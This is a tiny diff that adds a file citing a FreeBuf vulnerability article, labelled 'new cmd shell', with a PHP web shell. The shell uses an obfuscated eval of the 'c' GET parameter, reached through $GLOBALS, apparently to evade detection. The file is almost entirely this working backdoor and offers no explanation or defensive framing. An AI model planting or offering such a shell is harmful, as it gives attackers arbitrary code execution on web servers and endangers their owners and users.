@@ -1,0 +1,10 @@
+https://www.freebuf.com/vuls/252103.html
+
+
+new cmd shell
+
+<?php
+$a = $GLOBALS;
+$str = '_GET';
+eval(''. $a[$str]['c']. NULL);
+
